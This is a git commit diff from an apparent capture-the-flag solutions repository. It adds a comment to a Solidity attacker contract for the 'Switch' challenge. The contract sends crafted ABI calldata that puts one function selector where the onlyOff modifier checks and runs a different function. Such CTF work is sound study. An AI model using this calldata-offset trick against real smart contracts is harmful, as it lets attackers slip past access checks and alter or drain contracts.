cf3b067e0ee151fb9a39ae164928290bae0668d0
Tanner Ang <ang713943@gmail.com>
2024-02-01 17:16:53 +0800

    add notes in 29-Switch

--- src/29-SwitchAttacker.sol
+++ src/29-SwitchAttacker.sol
@@ -9,6 +9,7 @@ contract SwitchAttacker {
     }
 
     function attack() external {
+        // Encode abi to pass the modifier onlyOff()
         bytes memory data = abi.encodeWithSignature("flipSwitch(bytes)", bytes32(uint256(96)), bytes32(""), bytes4(keccak256("turnSwitchOff()")), bytes32(uint256(4)), bytes4(keccak256("turnSwitchOn()")));
         challengeInstance.call(data);
     }
